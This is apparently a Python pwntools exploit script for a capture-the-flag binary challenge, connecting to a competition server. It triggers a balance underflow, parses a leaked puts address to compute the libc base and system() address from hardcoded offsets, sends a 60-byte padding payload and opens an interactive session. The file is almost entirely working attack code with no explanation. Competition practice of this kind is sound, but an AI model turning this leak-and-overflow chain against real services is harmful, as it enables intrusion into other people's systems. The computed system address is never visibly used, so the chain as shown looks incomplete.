import re
from pwn import *  # type: ignore
from time import sleep

context(arch="amd64", os="linux")
# context.log_level = "DEBUG"

RECV_DELAY = 1
RECV_SIZE = 32768

libc = ELF("libc.so.6")

# readelf -Ws libc.so.6 | grep ' puts\W'


def parse_steps(fname: str):
    with open(fname, "r") as file:
        fc = file.read().split("\n")

        # filter out comment lines
        fc = filter(lambda x: len(x) != 0 and x[0] != "#", fc)
        fc = "\n".join(fc)

        # plus signs = inline newlines
        return fc.replace("+", "\n")


r = remote("chal.pctf.competitivecyber.club", 4444)


def recv():
    sleep(RECV_DELAY)
    return r.recv(RECV_SIZE).decode()


# get balance to underflow
tip_spam_txt = parse_steps("1_spam_tips.txt")
r.send(bytes(tip_spam_txt, "utf-8"))
recv()

# buy the book
r.send(b"2\n3\ny\n")
sleep(RECV_DELAY)
res = recv()

# get address of puts
pattern = r"0x[0-9a-f]+"
puts_addr = re.findall(pattern, res)[0]
print(f"Address of `puts`: {puts_addr}")

# puts is 0x80ed0 offset from libc base
libc_addr = int(puts_addr, 16) - 0x80ED0
libc.address = libc_addr
print(f"Address of libc base: {hex(libc_addr)}")

sys_addr = libc_addr + 0x050D60
print(f"Address of `system`: {hex(sys_addr)}")

r.send(b"1\ny\n")
r.send(b"a" * 60)
recv()

r.send(b"\n3\n\n")
print(recv())

r.interactive()

r.close()
